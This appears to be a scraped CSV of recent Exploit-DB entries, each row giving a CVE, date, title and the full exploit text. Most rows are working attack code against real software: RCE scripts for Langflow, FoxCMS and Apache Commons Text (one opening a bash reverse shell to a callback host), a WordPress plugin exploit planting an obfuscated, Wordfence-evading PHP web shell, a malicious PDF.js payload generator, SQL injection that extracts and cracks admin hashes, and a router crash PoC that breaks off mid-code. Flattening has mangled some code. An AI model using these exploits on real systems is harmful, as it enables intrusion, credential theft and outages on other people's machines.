CVE-2025-28121,"{""CVE-2025-28121"": 1}",2025-04-22,code-projects Online Exam Mastering System 1.0 - Reflected Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/52272,"Exploit Title: code-projects Online Exam Mastering System 1.0 - Reflected Cross-Site Scripting (XSS) Google Dork: inurl:/exam/feedback.php Date: 2025-04-19 Exploit Author: Pruthu Raut Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: XAMPP on Windows 10 / Kali Linux (Apache + PHP 7.x) CVE : CVE-2025-28121 Description: code-projects Online Exam Mastering System 1.0 is vulnerable to a Reflected XSS vulnerability in feedback.php via the ""q"" parameter. The application fails to sanitize user input properly, allowing attackers to inject arbitrary JavaScript code. Vulnerable URL: # <URL>"
CVE-2024-4367,"{""CVE-2024-4367"": 1}",2025-04-22,Firefox ESR 115.11 - PDF.js Arbitrary JavaScript execution,https://www.exploit-db.com/exploits/52273,"Exploit Title: Firefox ESR 115.11 - Arbitrary JavaScript execution in PDF.js Date: 2025-04-16 Exploit Author: Milad Karimi (Ex3ptionaL) Contact: miladgrayhat.com Zone-H: <URL> MiRROR-H: <URL> Vendor Homepage: <URL> Version: = 115.11 Tested on: Win, Ubuntu CVE : CVE-2024-4367 #!/usr/bin/env python3 import sys def generatepayload(payload): backslashchar = ""\\"" fmtpayload = payload.replace('(', '\\(').replace(')', '\\)') fontmatrix = f""/FontMatrix [0.1 0 0 0.1 0 (1{backslashchar});\n"" + f""{fmtpayload}"" + ""\n//)]"" return f"" %PDF-1.4 %DUMMY 8 0 obj /PatternType 2 /Shading<< /Function<< /Domain[0 1] /C0[0 0 1] /C1[1 0.6 0] /N 1 /FunctionType 2 /ShadingType 2 /Coords[46 400 537 400] /Extend[false false] /ColorSpace/DeviceRGB /Type/Pattern endobj 5 0 obj /Widths[573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 573 0 573 0 341] /Type/Font /BaseFont/PAXEKO+SourceSansPro-Bold /LastChar 102 /Encoding/WinAnsiEncoding {fontmatrix} /Subtype/Type1 /FirstChar 65 /FontDescriptor 9 0 R endobj 2 0 obj /Kids[3 0 R] /Type/Pages /Count 1 endobj 9 0 obj /Type/FontDescriptor /ItalicAngle 0 /Ascent 751 /FontBBox[-6 -12 579 713] /FontName/PAXEKO+SourceSansPro-Bold /StemV 100 /CapHeight 713 /Flags 32 /FontFile3 10 0 R /Descent -173 /MissingWidth 250 endobj 6 0 obj /Length 128 stream 47 379 489 230 re S /Pattern cs BT 50 500 Td 117 TL /F1 150 Tf /P1 scn (AbCdEf) Tj /P2 scn (AbCdEf) ' ET endstream endobj 3 0 obj /Type/Page /Resources 4 0 R /Contents 6 0 R /Parent 2 0 R /MediaBox[0 0 595.2756 841.8898] endobj 10 0 obj /Length 800 /Subtype/Type2 stream endstream endobj 7 0 obj /PatternType 1 /Matrix[1 0 0 1 50 0] /Length 58 /TilingType 1 /BBox[0 0 16 16] /YStep 16 /PaintType 1 /Resources<< /XStep 16 stream 0.65 g 0 0 16 16 re f 0.15 g 0 0 8 8 re f 8 8 8 8 re f endstream endobj 4 0 obj /Pattern<< /P1 7 0 R /P2 8 0 R /Font<< /F1 5 0 R endobj 1 0 obj /Pages 2 0 R /Type/Catalog /OpenAction[3 0 R /Fit] endobj xref 0 11 0000000000 65535 f 0000002260 00000 n 0000000522 00000 n 0000000973 00000 n 0000002178 00000 n 0000000266 00000 n 0000000794 00000 n 0000001953 00000 n 0000000015 00000 n 0000000577 00000 n 0000001085 00000 n trailer /ID[(DUMMY) (DUMMY)] /Root 1 0 R /Size 11 startxref 2333 %%EOF if name == ""main_"": if len(sys.argv) != 2: print(f""Usage: {sys.argv[0]} "") sys.exit(1) print(""[+] Created malicious PDF file:"
CVE-2023-2745,"{""CVE-2023-2745"": 1}",2025-04-22,WordPress Core 6.2 - Directory Traversal,https://www.exploit-db.com/exploits/52274,"Exploit Title: WordPress Core 6.2 - Directory Traversal Date: 2025-04-16 Exploit Author: Milad Karimi (Ex3ptionaL) Contact: miladgrayhat.com Zone-H: <URL> Version: = 6.2 Tested on: Win, Ubuntu CVE : CVE-2023-2745 import requests from colorama import init, Fore, Style init(autoreset=True) url = input(""E.G <URL> : "") payload = '../../../../../etc/passwd' response = requests.get(url, params={'wplang': payload}) if response.statuscode == 200: if ""root:x:0:0:root"" in response.text: print(Fore.GREEN + 'Exploit successful, accessed content:') print(Fore.GREEN + response.text) else: print(Fore.YELLOW + 'Accessed content, but the expected file was not found:') print(Fore.YELLOW + response.text) elif response.statuscode in {400, 401, 403, 404}: print(Fore.RED + f'Client error, status code: {response.statuscode}') elif response.statuscode // 100 == 5: print(Fore.RED + f'Server error, status code: {response.statuscode}') elif response.statuscode // 100 == 3: print(Fore.YELLOW + f'Redirection, status code: {response.statuscode}') else: print(f'Status code: {response.status_code}')"
CVE-2024-45440,"{""CVE-2024-45440"": 1}",2025-04-19,Drupal 11.x-dev - Full Path Disclosure,https://www.exploit-db.com/exploits/52266,"#!/usr/bin/env python Exploit Title: Drupal 11.x-dev - Full Path Disclosure Date: 2025-04-16 Exploit Author: Milad Karimi (Ex3ptionaL) Contact: miladgrayhat.com Zone-H: <URL> MiRROR-H: <URL> Version: 11.x-dev CVE: CVE-2024-45440 # -- coding:UTF-8 -- import re import requests def banners(): cveid = ""CVE-2024-45440"" description = ""Drupal 11.x-dev Full Path Disclosure Vulnerability: "" \ ""core/authorize.php allows Full Path Disclosure (even when error logging is None) "" \ ""if the value of hashsalt is filegetcontents of a file that does not exist."" disclaimer = ""This tool is for educational purposes only. Any misuse of this information is the responsibility of "" \ ""the person utilizing this tool. The author assumes no responsibility or liability for any misuse or "" \ ""damage caused by this program."" width = 100 bannertopbottom = ""="" width banner_middle = f""{cve_id:^{width}}\n\n{description:^{width}}"" banner = f""{banner_top_bottom}\n\n{banner_middle}\n\n{disclaimer}\n\n{banner_top_bottom}"" return banner def scan_single_url(url=None): if url is None: print(""[+] Input the IP/Domain Example: 127.0.0.1 or 127.0.0.1:8080"") url = input(""[+] IP/Domain: "") if not url.startswith(' <URL> and not url.startswith(' <URL> full_url = ' <URL> + url + '/core/authorize.php' print(""[] Scanning."") try: headers = { ""Host"": url, ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8"", ""Accept-Language"": ""zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"" response = requests.get(fullurl, headers,timeout=10) pattern = r' (/.*?settings\.php)' matches = re.findall(pattern, response.text) print(response.text) if 'settings.php' in response.text: print(f""[+] {url} Existed!"") for match in matches: print(""[+] The full path is:"", match) return True else: print(f""[-] {url} Not Exist!"") return False except TimeoutError: print(f""[-] {url} Timeout!"") except Exception as e: print(f""[-] {url} Failed!"") return False def scanmultipleurls(): print(""[+] Input the path of txt Example: ./url.txt or C:\\the\\path\\to\\url.txt"") urlpath = input(""[+] Path: "") urllist = [] resultlist = [] try: with open(urlpath, 'r', encoding='utf-8') as f: lines = f.readlines() for line in lines: urllist.append(line.strip()) except FileNotFoundError as e: print(""[-] File Not Found!"") for url in urllist: result = scansingleurl(url) if result: resultlist.append(url) print(""[+] Successful Target:"") for result in resultlist: print(f""[+] {result}"") def main(): print(banners()) print(""[1] Scan single url\n[2] Scan multiple urls"") choice = input(""[+] Choose: "") if choice == '1': scansingleurl() elif choice == '2': scanmultipleurls() else: print(""[-] Invalid option selected!"") pass if name == 'main_': main()"
CVE-2025-29306,"{""CVE-2025-29306"": 1}",2025-04-19,FoxCMS 1.2.5 - Remote Code Execution  (RCE),https://www.exploit-db.com/exploits/52267,"Date: 2025-04-17 Exploit Title: Exploit Author: VeryLazyTech Vendor Homepage: <URL> Software Link: <URL> Version: FoxCMS v.1.2.5 Tested on: Ubuntu 22.04, Windows Server 2019 CVE: CVE-2025-29306 Website: <URL> #!/bin/bash banner() { cat <<'EOF' | |_ \ V / | | / /| || / / ) | / / \, |) | || | () | \ V / / | | || | | || (_| |/ /| |_| | | | / (| | | | - Medium EOF Call the banner function banner set -e Check for correct number of arguments if [ ""$#"" -ne 2 ]; then printf ""Usage: $0 "" exit 1 fi TARGET=$1 Encode payload ENCODEDCMD=$(python3 -c ""import urllib.parse; print(urllib.parse.quote('\${((\""$2\""))}'))"") FULLURL=""${TARGET}?id=${ENCODEDCMD}"" echo ""[] Sending RCE payload: $2"" HTML=$(curl -s ""$FULL_URL"") Extract from known XPath location using xmllint UL_CONTENT=$(echo ""$HTML"" | xmllint --html --xpath ""/html/body/header/div[1]/div[2]/div[1]/ul"" - 2>/dev/null) Strip tags, clean up CLEANED=$(echo ""$UL_CONTENT"" | sed 's/<[^>]>//g' | sed '/^$/d' | sed 's/^[[:space:]]*//') echo echo ""[+] Command Output:"" echo ""$CLEANED"""
CVE-2025-3248,"{""CVE-2025-3248"": 1}",2025-04-18,Langflow 1.3.0 -  Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52262,"Exploit Title: Langflow 1.3.0 - Remote Code Execution (RCE) Date: 2025-04-17 Exploit Author: VeryLazyTech Vendor Homepage: <URL> Software Link: <URL> Version: Langflow < 1.3.0 Tested on: Windows Server 2019 CVE: CVE-2025-3248 CVE-2025-3248 - Remote and unauthenticated attacker can send crafted HTTP requests to execute arbitrary code FOFA ""Langflow"" Medium: <URL> GitHub: <URL> Shop: <URL> Website: <URL> import argparse import requests import json from urllib.parse import urljoin import random from colorama import init, Fore, Style Disable SSL warnings requests.packages.urllib3.disablewarnings() Initialize colorama init(autoreset=True) Constants ENDC = ""\033[0m"" ENCODING = ""UTF-8"" COLORS = [Fore.GREEN, Fore.CYAN, Fore.BLUE] def banner(): randomcolor = random.choice(COLORS) return f""{Style.BRIGHT}{randomcolor} | | \ V / | | / /| || / / ) | ) / /| _| (_) | \ V / / | | || | | || (| |/ /| || | | | / (| | | | {Style.BRIGHT}{Fore.WHITE} - Medium {Style.RESETALL}\n {Style.RESETALL} print(banner()) class LangflowScanner: def init(self, url, timeout=10): self.url = url.rstrip('/') self.timeout = timeout self.session = requests.Session() self.session.verify = False self.session.headers.update({ 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json', 'Accept': 'application/json', def exploit(self, command): endpoint = urljoin(self.url, '/api/v1/validate/code') payload = { ""code"": f"" def run(cd=exec('raise Exception(import(""subprocess"").checkoutput(""{command}"", shell=True))')): pass try: print(f""{Fore.YELLOW}[] Sending payload to {endpoint}"") response = self.session.post(endpoint, json=payload, timeout=self.timeout) print(f""{Fore.YELLOW}[] Status Code: {response.statuscode}"") print(f""{Fore.YELLOW}[*] Raw Response: {response.text}"") if response.statuscode == 200: try: data = response.json() errormsg = data.get(""function"", {}).get(""errors"", [""""])[0] if isinstance(errormsg, str) and errormsg.startswith(""b'""): output = errormsg[2:-1].encode().decode('unicodeescape').strip() return output except Exception as e: return f""[!] Failed to parse response: {str(e)}"" return f""[!] Exploit failed with status {response.statuscode}"" except requests.RequestException as e: return f""[!] Request failed: {str(e)}"" def main(): parser = argparse.ArgumentParser(description=""Langflow CVE-2025-3248 Exploit"") parser.addargument(""url"", help=""Target base URL (e.g., <URL> parser.addargument(""cmd"", help=""Command to execute (e.g., whoami)"") args = parser.parseargs() scanner = LangflowScanner(args.url) result = scanner.exploit(args.cmd) print(f""{Fore.GREEN}[+] Command Output:\n{result}"") if name == ""main_"": main()"
CVE-2024-11972,"{""CVE-2024-11972"": 1}",2025-04-18,Hunk Companion Plugin 1.9.0 - Unauthenticated Plugin Installation,https://www.exploit-db.com/exploits/52259,"Exploit Title: Hunk Companion Plugin 1.9.0 - Unauthenticated Plugin Installation Date: 16 December, 2024 Exploit Author: Jun Takemura Author's GitHub: <URL> Author's Blog: juntakemura.dev Vendor Homepage: <URL> Software Link: <URL> Version: Tested on Hunk Companion 1.8.8 CVE: CVE-2024-11972 Vulnerability Description: Exploits a flaw in the Hunk Companion plugin's permissioncallback for the # /wp-json/hc/v1/themehunk-import endpoint, allowing unauthenticated attackers to install and activate arbitrary plugins from the WordPress.org repository. Tested on: Ubuntu Original vulnerability discovered by: Daniel Rodriguez Usage: 1. Update `targeturl below with the target WordPress site's URL. 2. Update pluginname` with the slug of the plugin you want to install. 3. Run: python3 exploit.py import requests from urllib.parse import urljoin Update 'URL' with your target WordPress site URL, for example "" <URL> targeturl = ""URL"" Update 'NAME' with desired plugin's name (slug), for example ""wp-query-console"" pluginname = ""NAME"" endpoint = ""/wp-json/hc/v1/themehunk-import"" url = urljoin(targeturl, endpoint) payload = { ""params"": { ""plugin"": { pluginname: ""Plugin Label"" ""allPlugins"": [ pluginname: f""{pluginname}/{pluginname}.php"" ""themeSlug"": ""theme"", ""proThemePlugin"": ""plugin"", ""templateType"": ""free"", ""tmplFreePro"": ""theme"", ""wpUrl"": targeturl headers = { ""User-Agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64)"", ""Content-Type"": ""application/json"" try: response = requests.post(url, json=payload, headers=headers, timeout=10) response.raiseforstatus() Raises an HTTPError if the response is not 2xx print(f""[+] Exploit sent successfully."") print(f""Response Status Code: {response.statuscode}"") print(f""Response Body: {response.text}"") except requests.exceptions.RequestException as e: print(f""[-] Request failed: {e}"")"
CVE-2021-25094,"{""CVE-2021-25094"": 1}",2025-04-18,Tatsu 3.3.11 - Unauthenticated RCE,https://www.exploit-db.com/exploits/52260,"Exploit Title:Tatsu 3.3.11 - Unauthenticated RCE Date: 2025-04-16 Exploit Author: Milad Karimi (Ex3ptionaL) Contact: miladgrayhat.com Zone-H: <URL> MiRROR-H: <URL> Product: Tatsu wordpress plugin <= 3.3.11 CVE: CVE-2021-25094 URL: <URL> import sys import requests import argparse import urllib3 import threading import time import base64 import queue import io import os import zipfile import string import random from datetime import datetime urllib3.disablewarnings() class HTTPCaller(): def init(self, url, headers, proxies, cmd): self.url = url self.headers = headers self.proxies = proxies self.cmd = cmd self.encodedCmd = base64.b64encode(cmd.encode(""utf8"")) self.zipname = None self.shellFilename = None if self.url[-1] == '/': self.url = self.url[:-1] if proxies: self.proxies = {""http"" : proxies, ""https"" : proxies} else: self.proxies = {} def generateZip(self, compressionLevel, technique, customShell, keep): buffer = io.BytesIO() with zipfile.ZipFile(buffer, ""w"", zipfile.ZIPDEFLATED, False, compressionLevel) as zipFile: if technique == ""custom"" and customShell and os.path.isfile(customShell): with open(customShell) as f: shell = f.readlines() shell = ""\n"".join(shell) self.shellFilename = os.path.basename(customShell) if self.shellFilename[0] != ""."": self.shellFilename = ""."" + self.shellFilename zipFile.writestr(self.shellFilename, shell) elif technique == ""php"": a lazy obfuscated shell, basic bypass Wordfence i would change base64 encoding for something better shell = ""<?php "" shell += ""$f = \""lmeyst\"";"" shell += ""@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"" shell += ""@$words = array(base64decode($POST['text']));"" shell += ""$j=\""array\"".\""\"".\""filter\"";"" shell += ""@$filteredwords = $j($words, $a);"" if not keep: shell += ""(FILE);"" self.shellFilename = ""."" + (''.join(random.choice(string.asciilowercase) for i in range(5) + "".php"" zipFile.writestr(self.shellFilename, shell) elif technique.startswith(""htaccess""): requires AllowOverride All in the apache config file shell = ""AddType application/x-httpd-php .png\n"" zipFile.writestr("".htaccess"", shell) shell = ""<?php "" shell += ""$f = \""lmeyst\"";"" shell += ""@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"" shell += ""@$words = array(base64decode($POST['text']));"" shell += ""$j=\""array\"".\""\"".\""filter\"";"" shell += ""@$filteredwords = $j($words, $a);"" if not keep: shell += ""('.'+'h'+'t'+'a'+'cc'+'e'+'ss');"" shell += ""(FILE);"" self.shellFilename = ""."" + (''.join(random.choice(string.asciilowercase) for i in range(5) + "".png"" zipFile.writestr(self.shellFilename, shell) else: print(""Error: unknow shell technique %s"" % technique) sys.exit(1) self.zipname = ''.join(random.choice(string.asciilowercase) for i in range(3)) self.zipFile = buffer def getShellUrl(self): return ""%s/wp-content/uploads/typehub/custom/%s/%s"" % (self.url, self.zipname, self.shellFilename) def executeCmd(self): return requests.post(url = self.getShellUrl(), data = {""text"": self.encodedCmd}, headers = self.headers, proxies = self.proxies, verify=False) def upload(self): url = ""%s/wp-admin/admin-ajax.php"" % self.url files = {""file"": (""%s.zip"" % self.zipname, self.zipFile.getvalue())} return requests.post(url = url, data = {""action"": ""addcustomfont""}, files = files, headers = self.headers, proxies = self.proxies, verify=False) def main(): description = ""|= Tatsudo: pre-auth RCE exploit for Tatsu wordpress plugin <= 3.3.8\n"" description += ""|= CVE-2021-25094 / Vincent MICHEL ()"" print(description) print("""") parser = argparse.ArgumentParser() parser.addargument(""url"", help=""Wordpress vulnerable URL (example: <URL> parser.addargument(""cmd"", help=""OS command to execute"") parser.addargument('--technique', help=""Shell technique: php | htaccess | custom"", default=""php"") parser.addargument('--customShell', help=""Provide a custom PHP shell file that will take a base64 cmd as $POST['text'] input"") parser.addargument('--keep', help=""Do not auto-destruct the uploaded PHP shell"", default=False, type=bool) parser.addargument('--proxy', help=""Specify and use an HTTP proxy (example: <URL> parser.addargument('--compressionLevel', help=""Compression level of the zip file (0 to 9, default 9)"", default=9, type=int) args = parser.parseargs() Use web browser-like header headers = { ""X-Requested-With"": ""XMLHttpRequest"", ""Origin"": args.url, ""Referer"": args.url, ""User-Agent"": ""Mozilla/5.0 (X11; Linux x8664) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"", ""Accept"": ""*/*"", ""Accept-Language"": ""en-US,en;q=0.9"" caller = HTTPCaller(args.url, headers, args.proxy, args.cmd) print(""[+] Generating a zip with shell technique '%s'"" % args.technique) caller.generateZip(args.compressionLevel, args.technique, args.customShell, args.keep) print(""[+] Uploading zip archive to %s/wp-admin/admin-ajax.php?action=addcustomfont"" % (args.url)) r = caller.upload() if (r.statuscode != 200 or not r.text.startswith('{""status"":""success""')): print(""[!] Got an unexpected HTTP response: %d with content:\n%s"" % (r.statuscode, r.text)) print(""[!] Exploit failed!"") sys.exit(1) print(""[+] Upload OK"") print(""[+] Trigger shell at %s"" % caller.getShellUrl()) r = caller.executeCmd() if (r.statuscode != 200): print(""[!] Got an unexpected HTTP response: %d with content:\n%s"" % (r.statuscode, r.text)) print(""[!] Exploit failed!"") sys.exit(1) print(""[+] Exploit success!"") print(r.text) if args.keep: print(""[+] Call it with:"") print('curl -X POST -d""text=$(echo ""{0}"" | base64 -w0)"" {1}'.format(args.cmd, caller.getShellUrl() else: print(""[+] Shell file has been auto-deleted but parent directory will remain on the webserver"") print(""[+] Job done"") if name == 'main_': main()"
CVE-2022-42889,"{""CVE-2022-42889"": 1}",2025-04-18,Apache Commons Text  1.10.0 - Remote Code Execution,https://www.exploit-db.com/exploits/52261,"Exploit Title: Apache Commons Text 1.10.0 - Remote Code Execution (Text4Shell - POST-based) Date: 2025-04-17 Exploit Author: Arjun Chaudhary Vendor Homepage: <URL> Software Link: <URL> Version: Apache Commons Text < 1.10.0 Tested on: Ubuntu 20.04 (Docker container), Java 11+, Apache Commons Text 1.9 CVE: CVE-2022-42889 Type: Remote Code Execution (RCE) Method: POST request, script interpolator Notes: This exploit demonstrates an RCE vector via POST data, differing from common GET-based payloads. #!/usr/bin/env python3 import urllib.parse import http.client import sys def usage(): print(""Usage: python3 text4shell.py "") print(""Example: python3 text4shell.py 127.0.0.1 192.168.22.128 4444"") sys.exit(1) if len(sys.argv) != 4: usage() targetip = sys.argv[1] callbackip = sys.argv[2] callbackport = sys.argv[3] rawpayload = ( f""${{script:javascript:var p=java.lang.Runtime.getRuntime().exec("" f""['bash','-c','bash -c \\'exec bash -i >& /dev/tcp/{callbackip}/{callbackport} 0>&1\\''])}}"" encodedpayload = urllib.parse.quote(rawpayload) path = f""/?data={encodedpayload}"" modify the parameter according to your target print(f""[!] Remember to modify the parameter according to your target"") print(f""[+] Target: <URL> print(f""[+] Payload (decoded): {rawpayload}"") conn = http.client.HTTPConnection(targetip, 80) conn.request(""POST"", path, body="""", headers={ ""Host"": target_ip, ""Content-Type"": ""application/json"", ""Content-Length"": ""0"" response = conn.getresponse() print(f""[+] Response Status: {response.status}"") print(response.read().decode()) conn.close()"
CVE-2024-44541,"{""CVE-2024-44541"": 1}",2025-04-18,Inventio Lite 4 - SQL Injection,https://www.exploit-db.com/exploits/52263,"Exploit Title: Inventio Lite 4 - SQL Injection Error Based SQLi in ""username"" parameter on ""/?action=processlogin."" Date: 08/21/2024 Exploit Author: pointedsec Vendor Homepage: <URL> Software Link: <URL> Version: < 4 Tested on: Linux, Windows CVE : CVE-2024-44541 This scripts exploit this vulnerability, extracting the hashes from database and tries to decrypt it. The passwords are hashed like this: $pass = sha1(md5($POST['password'])); import requests import signal from pwn import * BASEURL = "" <URL> PWDDICPATH = ""/usr/share/wordlists/rockyou.txt"" LOGINACTION = BASEURL + ""?action=processlogin"" Handling Ctrl + C def defhandler(x,y): log.failure(""Quitting."") exit(1) signal.signal(signal.SIGINT, defhandler) def isvulnerable(): log.info(""Checking if target is vulnerable"") payload = { ""username"": ""\"") \"""", ""password"": ""\"") \"""" r = requests.post(LOGINACTION, data=payload) if (r.statuscode != 200 or ""Uncaught mysqlisqlexception"" in r.text): return True else: return False def getadministratorhash(username): proghash = log.progress(""Extracting Admin Password Hash"") replacepayload = ""\"") or username LIKE ' ' or email LIKE ' ' and password LIKE ' %' and isadmin=1 LIMIT 1-- -"".replace("" "", username) characters = ""abcdefghijklmnopqrstuvwxyz0123456789"" SHA(MD5(PASSWORD)) so there are no symbols and no uppercases adminhash = """" while True: foundchar = False for char in characters: payload = { ""username"": replacepayload.replace("" "", adminhash + char), ""password"": ""blablablbalbablalba123@"" try: r = requests.post(LOGINACTION, data=payload) r.raiseforstatus() except requests.RequestException as e: log.error(f""Request failed: {e}"") continue if "" "" in r.text: adminhash += char proghash.status(""-> %s"" % adminhash) foundchar = True break if not foundchar: break proghash.status(""Final Admin Hash: %s"" % adminhash) return adminhash def getadministratorusername(): progusername = log.progress(""Extracting Username"") replacepayload = ""\"") or username like ' %' or email like ' %' and isadmin=1 LIMIT 1-- -"" characters = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@."" username = """" while True: foundchar = False for char in characters: payload = { ""username"": replacepayload.replace("" "", username + char), ""password"": ""blablablablbalbla123@"" r = requests.post(LOGINACTION, data=payload) if "" "" in r.text: username += char progusername.status(""-> %s"" % username) foundchar = True break if not foundchar: break return username def decryptpassword(adminhash): Encryption is SHA1(MD5(PWD)) with open(PWDDICPATH) as passwordfile: for password in passwordfile: password = password.strip() md5hash = hashlib.md5(password.encode()).hexdigest() sha1hash = hashlib.sha1(md5hash.encode()).hexdigest() if sha1hash == adminhash: return password log.error(""Password not found in the dictionary."") return None if name == ""main"": Check if target is vulnerable if not isvulnerable(): log.failure(""Target not Vulnerable."") exit(1) log.success(""Target Vulnerable!"") log.info(""Dumping Administrator username."") adminusername = getadministratorusername() adminhash = getadministratorhash(adminusername) pwd = decryptpassword(adminhash) log.success(f""Password Decrypted! -> {adminusername}:{pwd}"") log.info(""Try to Log In with that username, if that doesn't work, try with some uppercase/lowercase combinations"")"
CVE-2024-12483,"{""CVE-2024-12483"": 1}",2025-04-18,UJCMS 9.6.3 - User Enumeration via IDOR,https://www.exploit-db.com/exploits/52264,"Exploit Title: UJCMS 9.6.3 User Enumeration via IDOR Exploit Author: Cyd Tseng Date: 11 Dec 2024 Category: Web application Vendor Homepage: <URL> Software Link: <URL> Version: UJCMS 9.6.3 Tested on: Linux CVE: CVE-2024-12483 Advisory: <URL> An Insecure Direct Object Reference (IDOR) vulnerability was discovered in UJCMS version 9.6.3 that allows unauthenticated enumeration of usernames through the manipulation of the user id parameter in the /users/id endpoint. While the user IDs are generally large numbers (e.g., 69278363520885761), with the exception of the admin and anonymous account, unauthenticated attackers can still systematically discover usernames of existing accounts. import requests from bs4 import BeautifulSoup import time import re BASEURL = ' <URL> Modify as necessary! HEADERS = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Connection': 'keep-alive' def fetchuserdata(userid): url = BASEURL.format(userid) try: response = requests.get(url, headers=HEADERS) if response.statuscode == 200: soup = BeautifulSoup(response.content, 'html.parser') title = soup.title.string.strip() if title.lower() != '404': username = re.sub(r' - UJCMS演示站$', '', title) return userid, username return None except requests.RequestException as e: print(f""Error fetching data for user ID {userid}: {e}"") return None def useridgenerator(start, end): for userid in range(start, end + 1): yield userid def enumerateusers(startid, endid): for userid in useridgenerator(startid, endid): userdata = fetchuserdata(userid) if userdata: print(f""Valid user found: ID {userdata[0]} with username '{userdata[1]}'"") time.sleep(0.1) if name == 'main': startid = int(input(""Enter the starting user ID: "")) endid = int(input(""Enter the ending user ID: "")) print(f""Starting enumeration from ID {startid} to {endid}."") enumerateusers(startid, end_id)"
CVE-2024-11728,"{""CVE-2024-11728"": 1}",2025-04-18,KiviCare Clinic &amp; Patient Management System (EHR) 3.6.4 - Unauthenticated SQL Injection,https://www.exploit-db.com/exploits/52265,"Exploit Title: KiviCare Clinic & Patient Management System (EHR) 3.6.4 - Unauthenticated SQL Injection SQL Injection Google Dork: inurl:""/wp-content/plugins/kivicare-clinic-management-system/ Date: 11/12/2024 Exploit Author: Samet ""samogod"" Gözet Vendor Homepage: wordpress.org Software Link: <URL> Version: < 3.6.5 Tested on: Ubuntu 22.04 CVE : CVE-2024-11728 #!/usr/bin/env python3 CVE-2024-11728 - KiviCare WordPress Plugin Unauthenticated SQL Injection"
CVE-2024-12344,"{""CVE-2024-12344"": 1}",2025-04-17,TP-Link VN020 F3v(T) TT_V6.2.1021 - Buffer Overflow Memory Corruption,https://www.exploit-db.com/exploits/52249,"Exploit Title: TP-Link VN020 F3v(T) TT_V6.2.1021 - Buffer Overflow Memory Corruption Date: 11/24/2024 Exploit Author: Mohamed Maatallah Vendor Homepage: <URL> Version: TT_V6.2.1021 (VN020-F3v(T)) Tested on: VN020-F3v(T) Router (Hardware Version 1.0) CVE: CVE-2024-12344 Category: Remote Description: A critical buffer overflow and memory corruption vulnerability was discovered in TP-Link VN020-F3v(T) router's FTP server implementation. The vulnerability stems from improper input validation of the USER command, allowing unauthenticated attackers to trigger various failure modes through payload size manipulation: 1. 1100 bytes - Delayed crash (5-10 seconds) 2. 1450 bytes - Immediate crash 3. >1450 bytes - Undefined behavior/state corruption Proof of Concept: (attached full c file) Compilation Instructions (Visual Studio): 1. Open Visual Studio 2. Create a new C Console Application 3. Add these additional dependencies to project settings: - ws2_32.lib - iphlpapi.lib 4. Ensure Windows SDK is installed 5. Set Platform Toolset to latest v143 or v142 6. Compile in Release or Debug mode Disclaimer: This proof of concept is for educational and research purposes only. Unauthorized testing without explicit permission is unethical and illegal. define CRTSECURENOWARNINGS include include include include include include include include pragma comment(lib, ""ws232.lib"") pragma comment(lib, ""iphlpapi.lib"") define DESTIP ""192.168.1.1"" // IP of target FTP server define DESTPORT 21 // Standard FTP port define PINGTIMEOUTMS 1000 // Network timeout define MAXPINGRETRIES 5 // Connectivity check attempts define CRASHSTRINGLENGTH 1450 // Exact number of 'A's triggering instantcrash define TOTALPAYLOADLENGTH (CRASHSTRINGLENGTH + 5 + 2) // USER + As + \r\n typedef struct { HANDLE icmphandle; IPAddr targetaddr; LPVOID replybuffer; DWORD replysize; } pingcontextt; void logmsg(const char prefix, const char msg) { SYSTEMTIME st; GetLocalTime(&st); printf(""[%02d:%02d:%02d] %s %s\n"", st.wHour, st.wMinute, st.wSecond, prefix, msg); void hexdump(const char desc, const void addr, const int len) { int i; unsigned char buff[17]; const unsigned char pc = (const unsigned char)addr; if (desc != NULL) printf(""%s:\n"", desc); for (i = 0; i < len; i++) { if ((i % 16) == 0) { if (i != 0) printf("" %s\n"", buff); printf("" %04x "", i); printf("" %02x"", pc[i]); if ((pc[i] < 0x20) || (pc[i] > 0x7e)) buff[i % 16] = '.'; else buff[i % 16] = pc[i]; buff[(i % 16) + 1] = '\0'; while ((i % 16) != 0) { printf("" ""); i++; printf("" %s\n"", buff); BOOL checkconnectivity(pingcontextt* ctx) { char sendbuf[32] = { 0 }; return IcmpSendEcho(ctx->icmphandle, ctx->targetaddr, sendbuf, sizeof(sendbuf), NULL, ctx->replybuffer, ctx->replysize, PINGTIMEOUTMS) > 0; char generate_exact_crash_payload() { char payload = (char)malloc(TOTAL_PAYLOAD_LENGTH + 1); // +1 for null terminator if (!payload) { log_msg(""[-]"", ""Failed to allocate payload memory""); return NULL; strcpy(payload, ""USER ""); // 5 bytes memset(payload + 5, 'A', CRASH_STRING_LENGTH); // 1450 'A's memcpy(payload + 5 + CRASH_STRING_LENGTH, ""\r\n"", 2); // 2 bytes payload[TOTAL_PAYLOAD_LENGTH] = '\0'; char debug_msg[100]; snprintf(debug_msg, sizeof(debug_msg), ""Generated payload of length %d ('A's + 5 byte prefix + 2 byte suffix)"", TOTAL_PAYLOAD_LENGTH); log_msg(""[]"", debugmsg); return payload; BOOL sendcrashpayload(const char* targetip, uint16t targetport) { WSADATA wsa; SOCKET sock = INVALIDSOCKET; struct sockaddrin server; char serverreply[2048]; int recvsize; pingcontextt pingctx = { 0 }; BOOL success = FALSE; if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { logmsg(""[-]"", ""Winsock initialization failed""); return FALSE; pingctx.icmphandle = IcmpCreateFile(); pingctx.replysize = 